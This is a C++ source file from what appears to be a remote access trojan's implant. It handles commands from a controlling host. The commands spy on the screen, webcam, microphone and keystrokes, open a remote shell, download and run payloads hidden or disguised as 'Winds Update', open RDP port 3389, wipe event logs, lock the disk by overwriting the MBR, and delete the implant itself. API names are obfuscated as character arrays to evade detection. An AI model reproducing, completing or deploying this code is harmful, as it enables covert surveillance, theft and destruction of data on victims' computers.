// KernelManager.cpp: implementation of the CKernelManager class.
//
//////////////////////////////////////////////////////////////////////

#include "../StdAfx.h"
#include "../Declare.h"   //动态调用库函数
#include "KernelManager.h"
#include "loop.h"
#include "until.h"
#include "../Myfunction.h"  //自定义函数

extern Myfunction *Gyfunction;

//////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////

char	CKernelManager::m_strMasterHost[256] = {0};
UINT	CKernelManager::m_nMasterPort = 80;
CKernelManager::CKernelManager(CClientSocket *pClient, LPCTSTR lpszServiceName, DWORD dwServiceType, LPCTSTR lpszKillEvent, 
		LPCTSTR lpszMasterHost, UINT nMasterPort) : CManager(pClient)
{
	char FBwWp22[] = {'l','s','t','r','c','p','y','A','\0'};
	lstrcpyAT plstrcpyA=(lstrcpyAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp22);
	if (lpszServiceName != NULL)
	{
		plstrcpyA(m_strServiceName, lpszServiceName);
	}
	if (lpszKillEvent != NULL)
		plstrcpyA(m_strKillEvent, lpszKillEvent);
	if (lpszMasterHost != NULL)
		plstrcpyA(m_strMasterHost, lpszMasterHost);

	m_nMasterPort = nMasterPort;
	m_dwServiceType = dwServiceType;
	m_nThreadCount = 0;
	// 初次连接，控制端发送命令表始激活
	m_bIsActived = false;
	// 创建一个监视键盘记录的线程
	// 键盘HOOK跟UNHOOK必须在同一个线程中
//	m_hThread[m_nThreadCount++] = 
//		MyCreateThread(NULL, 0,	(LPTHREAD_START_ROUTINE)Loop_HookKeyboard, NULL, 0,	NULL, true);

}

CKernelManager::CKernelManager(CClientSocket *pClient):CManager(pClient)
{
	m_nThreadCount = 0;
}


void CKernelManager::init(CClientSocket *pClient, LPCTSTR lpszServiceName, DWORD dwServiceType, LPCTSTR lpszKillEvent, 
		LPCTSTR lpszMasterHost, UINT nMasterPort)
{
	char FBwWp22[] = {'l','s','t','r','c','p','y','A','\0'};
	lstrcpyAT plstrcpyA=(lstrcpyAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp22);
	if (lpszServiceName != NULL)
	{
		plstrcpyA(m_strServiceName, lpszServiceName);
	}
	if (lpszKillEvent != NULL)
		plstrcpyA(m_strKillEvent, lpszKillEvent);
	if (lpszMasterHost != NULL)
		plstrcpyA(m_strMasterHost, lpszMasterHost);
	
	m_nMasterPort = nMasterPort;
	m_dwServiceType = dwServiceType;
	m_nThreadCount = 0;

	m_bIsActived = false;
}

CKernelManager::~CKernelManager()
{
	char BrmAP29[] = {'C','l','o','s','e','H','a','n','d','l','e','\0'};
	CloseHandleT pCloseHandle=(CloseHandleT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP29);
	char BrmAP30[] = {'T','e','r','m','i','n','a','t','e','T','h','r','e','a','d','\0'};
	TerminateThreadT pTerminateThread=(TerminateThreadT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP30);
	for(int i = 0; i < m_nThreadCount; i++)
	{
		pTerminateThread(m_hThread[i], -1);
		pCloseHandle(m_hThread[i]);
	}
}

///////////////
// 加上激活
void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
    char FBwWp25[] = {'S','l','e','e','p','\0'};
    SleepT pSleep=(SleepT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp25);
	char SSzlC21[] = {'I','n','t','e','r','l','o','c','k','e','d','E','x','c','h','a','n','g','e','\0'};
	InterlockedExchangeT pInterlockedExchange=(InterlockedExchangeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),SSzlC21);
	char BrmAP29[] = {'C','l','o','s','e','H','a','n','d','l','e','\0'};
	CloseHandleT pCloseHandle=(CloseHandleT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP29);
	char sIQkS05[] = {'C','r','e','a','t','e','T','h','r','e','a','d','\0'};
	CreateThreadT pCreateThread=(CreateThreadT)GetProcAddress(LoadLibrary("KERNEL32.dll"),sIQkS05);

	switch (lpBuffer[0])
	{
	case COMMAND_ACTIVED:
		pInterlockedExchange((LONG *)&m_bIsActived, true);
		break;
	case COMMAND_LIST_DRIVE: // 文件管理
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_FileManager, 
			(LPVOID)m_pClient->m_Socket, 0, NULL, false);
		break;
	case COMMAND_SCREEN_SPY: // 屏幕查看
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ScreenManager,
 			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
		break;
	case COMMAND_WEBCAM: // 摄像头
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_VideoManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_AUDIO: //语音
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_AudioManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_SHELL: // 远程sehll
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ShellManager, 
			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
		break;
	case COMMAND_KEYBOARD: // 键盘记录
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_KeyboardManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_SYSTEM: // 系统管理
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_SystemManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_DOWN_EXEC: // 下载者
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_DownManager,
			(LPVOID)(lpBuffer + 1), 0, NULL, true);
		pSleep(100); // 传递参数用
		break;
	case COMMAND_OPEN_URL_SHOW: // 显示打开网页
		OpenURL((LPCTSTR)(lpBuffer + 1), SW_SHOWNORMAL);
		break;
	case COMMAND_OPEN_URL_HIDE: // 隐藏打开网页
		OpenURL((LPCTSTR)(lpBuffer + 1), SW_HIDE);
		break;
	case COMMAND_REMOVE: // 卸载,
		UnInstallService();
		break;
	case COMMAND_CLEAN_ALL: // 清除全部日志
		CleanAllEvent();
		break;
	case COMMAND_SESSION: // 会话管理
		CSystemManager::ShutdownWindows(lpBuffer[1]);
		break;
	case COMMAND_RENAME_REMARK: // 改备注
		SetHostID(m_strServiceName, (LPCTSTR)(lpBuffer + 1));
		break;
	case COMMAND_CHANGE_GROUP: // 改分组
		SetGroup( m_strServiceName, (LPCTSTR)(lpBuffer + 1));
		break;
	case COMMAND_UPDATE_SERVER: // 更新服务端
		if (UpdateServer((char *)lpBuffer + 1))
			UnInstallService();
		break;
	case COMMAND_REPLAY_HEARTBEAT: // 回复心跳包
		break;
	/////////////////////////新功能//////////////////////////////
	case COMMAND_REGEDIT:          //注册表管理   
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_RegeditManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_SERMANAGER:  // 服务管理
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_SerManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_SHOW_MSG:  // 发送信息
		{
			pCloseHandle(pCreateThread(NULL,NULL,Loop_MsgBox,&lpBuffer[1],NULL,NULL));
			pSleep(500);
		}
		break;
	case COMMAND_SERVER_START:  //服务器管理
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0,(LPTHREAD_START_ROUTINE)Server_start, 
			(LPVOID)(lpBuffer + 1), 0,	NULL, true);
		break;
	case COMMAND_OPEN_3389: // 开启3389
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0,(LPTHREAD_START_ROUTINE)Open3389, 
			(LPVOID)(lpBuffer + 1), 0,	NULL, true);
		break;
	case COMMAND_DEL_SHIFTOSK:	//服务器操作
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0,(LPTHREAD_START_ROUTINE)Server_operation,
			(LPVOID)(lpBuffer + 1), 0,	NULL, true);
		break;
//	case COMMAND_OPEN_PROXY: // 开启代理
//		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)OpenProxy,
//			(LPVOID)(lpBuffer + 1), 0, NULL, true);
//		break;
	case COMMAND_KILL_MBR: // 硬盘锁
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)KillMBR, 
			(LPVOID)(lpBuffer + 1), 0, NULL, true);
		break;
//	case COMMAND_PORT_MAPPING: // 端口映射
//		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PORTMAPPING, 
//			(LPVOID)(lpBuffer + 1), 0, NULL, true);
//		break;
/*
	case COMMAND_FIND_PROCESS: // 进程筛选
		try
		{
			if (! isProcesin((LPTSTR)(lpBuffer + 1)))
			{				
				BYTE bToken = TOKEN_FIND_NO;
				m_pClient->Send(&bToken, 1);
			}
		}
		catch(...){}
		break;
	case COMMAND_FINDALL_PROCESS: // 进程筛选
		try
		{
			if (! isProcesin((LPTSTR)(lpBuffer + 1)))
			{				
				BYTE bToken = TOKEN_FINDALL_NO;
				m_pClient->Send(&bToken, 1);
			}
		}
		catch(...){}
		break;
		*/
	case COMMAND_SENDFILE_HIDE:  // 隐藏运行
		{
			OpenFile((LPCTSTR)(lpBuffer + 1), nSize -2, SW_HIDE);
		}
		break;
	case COMMAND_SENDFILE_NORMAL:  // 显示运行
		{
			OpenFile((LPCTSTR)(lpBuffer + 1), nSize -2, SW_SHOWNORMAL);
		}
		break;
	case COMMAND_SENDFILE_NOSTART:  // 不去运行
		{
			OpenFile((LPCTSTR)(lpBuffer + 1), nSize -2, 2);
		}
		break;
	case COMMAND_SENDFILE_UPDATA:  // 更新运行
		{
			if (OpenFile((LPCTSTR)(lpBuffer + 1), nSize -2, 3))
				UnInstallService();
		}
		break;					
	}	
}

void CKernelManager::UnInstallService()
{
	 DelSelf(NULL);//删除程序
     exit(0);
}

bool CKernelManager::IsActived()
{
	return	m_bIsActived;	
}

BOOL CKernelManager::OpenFile(const void *filedata, UINT size, INT nShowCmd)
{
	char	lpSubKey[500];
	HKEY	hKey;
	FILE	*fp;
	char	strTemp[MAX_PATH], strExePath[MAX_PATH], strRand[50];

	char DYrEN70[] = {'G','e','t','T','i','c','k','C','o','u','n','t','\0'};
	GetTickCountT pGetTickCount=(GetTickCountT)GetProcAddress(LoadLibrary("KERNEL32.dll"),DYrEN70);
	GetWindowsDirectoryAT pGetWindowsDirectoryA=(GetWindowsDirectoryAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"GetWindowsDirectoryA");
	pGetWindowsDirectoryA( strExePath, sizeof(strExePath) );
	strExePath[3] = '\0';

    char CtxPW50[] = {'w','s','p','r','i','n','t','f','A','\0'};
    wsprintfAT pwsprintfA=(wsprintfAT)GetProcAddress(LoadLibrary("USER32.dll"),CtxPW50);
	pwsprintfA( strRand, "\\Program Files\\Ru%d.EXE", pGetTickCount());
	char DmDjm01[] = {'l','s','t','r','c','a','t','A','\0'};
	lstrcatAT plstrcatA=(lstrcatAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),DmDjm01);
	plstrcatA(strExePath, strRand);
	fp = fopen( strExePath, "wb" );
	fwrite( filedata, size, 1, fp );
	fclose(fp);
	//	WinExec( strExePath, nShowCmd );
	//	return TRUE;
	char BrmAP30[] = {'C','r','e','a','t','e','P','r','o','c','e','s','s','A','\0'};
	CreateProcessAT pCreateProcessA=(CreateProcessAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP30);
	if ( nShowCmd == 3 )
	{
		STARTUPINFO si = {0};
		PROCESS_INFORMATION pi;
		si.cb = sizeof si;
		si.lpDesktop = "WinSta0\\Default"; 
		return pCreateProcessA(strExePath, "Winds Update", NULL, NULL, false, 0, NULL, NULL, &si, &pi);
	}
	if ( nShowCmd != 2 )
	{
		LONG	nSize = sizeof(strTemp);
		char	*lpstrCat = NULL;
		memset(strTemp, 0, sizeof(strTemp));
		
		char	*lpExt = strrchr(strExePath, '.');
		if (!lpExt)
			return false;
		
		char HrFvD08[] = {'R','e','g','O','p','e','n','K','e','y','E','x','A','\0'};
        RegOpenKeyExAT pRegOpenKeyExA=(RegOpenKeyExAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD08);
		if (pRegOpenKeyExA(HKEY_CLASSES_ROOT, lpExt, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
			return false;

		char HrFvD07[] = {'R','e','g','Q','u','e','r','y','V','a','l','u','e','A','\0'};
	    RegQueryValueAT pRegQueryValueA=(RegQueryValueAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD07);
		pRegQueryValueA(hKey, NULL, strTemp, &nSize);

		char HrFvD06[] = {'R','e','g','C','l','o','s','e','K','e','y','\0'};
	    RegCloseKeyT pRegCloseKey=(RegCloseKeyT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD06);
		pRegCloseKey(hKey);
		memset(lpSubKey, 0, sizeof(lpSubKey));

	    char CtxPW50[] = {'w','s','p','r','i','n','t','f','A','\0'};
        wsprintfAT pwsprintfA=(wsprintfAT)GetProcAddress(LoadLibrary("USER32.dll"),CtxPW50);
		char DYrEN31[] = {'%','s','\\','s','h','e','l','l','\\','o','p','e','n','\\','c','o','m','m','a','n','d','\0'};
		pwsprintfA(lpSubKey, DYrEN31, strTemp);
		
		if (pRegOpenKeyExA(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
			return false;
		memset(strTemp, 0, sizeof(strTemp));
		nSize = sizeof(strTemp);
		pRegQueryValueA(hKey, NULL, strTemp, &nSize);
		pRegCloseKey(hKey);
		
		lpstrCat = Gyfunction->my_strstr(strTemp, "\"%1");
		if (lpstrCat == NULL)
			lpstrCat = Gyfunction->my_strstr(strTemp, "%1");
	    char DmDjm01[] = {'l','s','t','r','c','a','t','A','\0'};
	    lstrcatAT plstrcatA=(lstrcatAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),DmDjm01);
	    char FBwWp22[] = {'l','s','t','r','c','p','y','A','\0'};
	    lstrcpyAT plstrcpyA=(lstrcpyAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp22);
		if (lpstrCat == NULL)
		{
			plstrcatA(strTemp, " ");
			plstrcatA(strTemp, strExePath);
		}
		else
			plstrcpyA(lpstrCat, strExePath);
		
		STARTUPINFO si = {0};
		PROCESS_INFORMATION pi;
		si.cb = sizeof si;
		if (nShowCmd != SW_HIDE)
			si.lpDesktop = "WinSta0\\Default"; 
		
		pCreateProcessA(NULL, strTemp, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
	}
	return false;
}
